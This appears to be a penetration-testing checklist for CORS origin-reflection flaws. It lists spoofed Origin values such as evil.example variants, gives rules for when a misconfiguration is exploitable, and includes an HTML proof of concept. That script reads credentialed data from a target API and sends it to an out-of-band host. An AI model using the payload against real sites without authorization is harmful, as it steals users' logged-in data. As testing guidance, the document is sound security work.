# CORS origin-reflection test matrix (step 2)
# Send each as the Origin header; record ACAO + ACAC in origin_tests.jsonl:
# {endpoint, origin_sent, acao, acac, reflected, exploitable}.

| Origin sent | Detects |
|---|---|
| `https://evil.example` | arbitrary-origin reflection (the big one) |
| `null` | `null` accepted (reachable via sandboxed iframe / data: URL) |
| `https://TARGET.evil.example` | prefix/subdomain-suffix regex gap |
| `https://evil-TARGET` / `https://TARGETevil.example` | naive `startsWith`/`includes(TARGET)` |
| `https://TARGET.com.evil.example` | post-domain gap (suffix match on `TARGET.com`) |
| `https://sub.TARGET.com` | trusted-subdomain wildcard (then find an XSS/takeover on a sub) |
| `http://TARGET.com` | scheme downgrade accepted |
| `https://TARGET.com.` | trailing-dot / parser quirk |

## Exploitability rule (what makes it real — see verify.md)
- `ACAO: <reflected attacker origin>` **and** `ACAC: true` **and** endpoint returns sensitive,
  credentialed data → exploitable (cross-origin credentialed read).
- `ACAO: *` **with** `ACAC: true` → browsers block; NOT exploitable as a credentialed read.
- `ACAO: *` **without** creds, but endpoint leaks sensitive data to anyone → finding (data exposure).

## Read PoC
```html
<script>
fetch('https://TARGET/api/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('//OOB/?'+encodeURIComponent(d.slice(0,100))));
</script>
```
Exfil only a benign marker/length in a real engagement unless retention is authorized.
